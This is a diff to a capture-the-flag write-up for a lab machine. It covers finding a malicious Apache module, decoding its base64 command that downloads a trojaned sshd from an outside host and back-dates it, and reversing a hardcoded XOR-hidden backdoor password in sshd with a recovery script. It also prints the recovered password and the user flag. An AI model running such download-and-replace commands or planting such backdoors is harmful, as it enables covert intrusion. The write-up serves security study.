@@ -193,10 +193,178 @@ Warning: Permanently added '10.10.11.146' (ED25519) to the list of known hosts.
 steven1@10.10.11.146's password: 
 steven@production:~$ id
 uid=1000(steven) gid=1000(steven) groups=1000(steven)
+steven@production:~$ cat user.txt 
+121cc1fdbcf41987aa4c1976572b6d90
 ````
-
-
 
 # Root
 
+## Enumeration
+
+> LinEnum
+````
+[-] Any interesting mail in /var/mail:
+total 12
+drwxrwsr-x  2 root   mail 4096 Feb  8 19:59 .
+drwxr-xr-x 13 root   root 4096 Feb  8 19:59 ..
+-rw-rw----  1 steven mail  966 Jul 25  2021 steven
+
+### SCAN COMPLETE ####################################
+````
+
+````
+steven@production:/tmp/...$ cat /var/mail/steven 
+From root@production  Sun, 25 Jul 2021 10:31:12 GMT
+Return-Path: <root@production>
+Received: from production (localhost [127.0.0.1])
+        by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
+        for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT
+Received: (from root@localhost)
+        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
+        Sun, 25 Jul 2021 10:31:12 GMT
+Date: Sun, 25 Jul 2021 10:31:12 GMT
+Message-Id: <202107251031.80FAcdZ171847@production>
+To: steven@production
+From: root@production
+Subject: Investigations
+
+Hi Steven.
+
+We recently updated the system but are still experiencing some strange behaviour with the Apache service.
+We have temporarily moved the web store and database to another server whilst investigations are underway.
+If for any reason you need access to the database or web application code, get in touch with Mark and he
+will generate a temporary password for you to authenticate to the temporary server.
+
+Thanks,
+sysadmin
+````
+
+Investigating the loaded modules from apache reveals a new file `mod_reader.so`:
+````
+steven@production:/usr/lib/apache2/modules$ ls -lhatr
+total 8.6M
+-rw-r--r-- 1 root root  34K May 17  2021 mod_reader.so
+drwxr-xr-x 3 root root 4.0K Jul  5  2021 ..
+-rw-r--r-- 1 root root 4.5M Nov 25 23:16 libphp7.4.so
+-rw-r--r-- 1 root root  27K Jan  5 14:49 mod_xml2enc.so
+-rw-r--r-- 1 root root  15K Jan  5 14:49 mod_vhost_alias.so
+-rw-r--r-- 1 root root  15K Jan  5 14:49 mod_usertrack.so
+-rw-r--r-- 1 root root  15K Jan  5 14:49 mod_userdir.so
+-rw-r--r-- 1 root root  15K Jan  5 14:49 mod_unique_id.so
+-rw-r--r-- 1 root root  15K Jan  5 14:49 mod_suexec.so
+````
+
+strings mod_reader.so
+````
+/bin/bash
+mod_reader.c
+d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk
+````
+
+````
+echo "d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk" | base64 -d
+
+wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
+````
+
+````c
+/* WARNING: Could not reconcile some variable overlaps */
+
+int auth_password(ssh *ssh,char *password)
+
+{
+  Authctxt *ctxt;
+  passwd *ppVar1;
+  int iVar2;
+  uint uVar3;
+  byte *pbVar4;
+  byte *pbVar5;
+  size_t sVar6;
+  byte bVar7;
+  int iVar8;
+  long in_FS_OFFSET;
+  char backdoor [31];
+  byte local_39 [9];
+  long local_30;
+  
+  bVar7 = 0xd6;
+  ctxt = (Authctxt *)ssh->authctxt;
+  local_30 = *(long *)(in_FS_OFFSET + 0x28);
+  backdoor._28_2_ = 0xa9f4;
+  ppVar1 = ctxt->pw;
+  iVar8 = ctxt->valid;
+  backdoor._24_4_ = 0xbcf0b5e3;
+  backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
+  backdoor[30] = -0x5b;
+  backdoor._0_4_ = 0xf0e7abd6;
+  backdoor._4_4_ = 0xa4b3a3f3;
+  backdoor._8_4_ = 0xf7bbfdc8;
+  backdoor._12_4_ = 0xfdb3d6e7;
+  pbVar4 = (byte *)backdoor;
+  while( true ) {
+    pbVar5 = pbVar4 + 1;
+    *pbVar4 = bVar7 ^ 0x96;
+    if (pbVar5 == local_39) break;
+    bVar7 = *pbVar5;
+    pbVar4 = pbVar5;
+  }
+  iVar2 = strcmp(password,backdoor);
+  uVar3 = 1;
+  if (iVar2 != 0) {
+    sVar6 = strlen(password);
+    uVar3 = 0;
+    if (sVar6 < 0x401) {
+      if ((ppVar1->pw_uid == 0) && (options.permit_root_login != 3)) {
+        iVar8 = 0;
+      }
+      if ((*password != '\0') ||
+         (uVar3 = options.permit_empty_passwd, options.permit_empty_passwd != 0)) {
+        if (auth_password::expire_checked == 0) {
+          auth_password::expire_checked = 1;
+          iVar2 = auth_shadow_pwexpired(ctxt);
+          if (iVar2 != 0) {
+            ctxt->force_pwchange = 1;
+          }
+        }
+        iVar2 = sys_auth_passwd(ssh,password);
+        if (ctxt->force_pwchange != 0) {
+          auth_restrict_session(ssh);
+        }
+        uVar3 = (uint)(iVar2 != 0 && iVar8 != 0);
+      }
+    }
+  }
+  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
+    return uVar3;
+  }
+                    /* WARNING: Subroutine does not return */
+  __stack_chk_fail();
+}
+````
+
+````python
+from pwn import *
+
+backdoor = []
+backdoor.extend(p32(0xf0e7abd6))
+backdoor.extend(p32(0xa4b3a3f3))
+backdoor.extend(p32(0xf7bbfdc8))
+backdoor.extend(p32(0xfdb3d6e7))
+backdoor.extend(p64(0xb2d6f4a0fda0b3d6))
+backdoor.extend(p32(0xbcf0b5e3))
+backdoor.extend((p32(0xa9f4a5)))
+
+key = b'\x96'
+for byte in backdoor[0:31]:
+     sys.stdout.write(chr(byte ^ ord(key)))
+````
+
+`@=qfe5%2^k-aq@%k@%6k6b@$u#f*3b?`
+
+
+
+
 # Secrets
+
+* FLAG_USER = 121cc1fdbcf41987aa4c1976572b6d90
+* FLAG_PASS = 
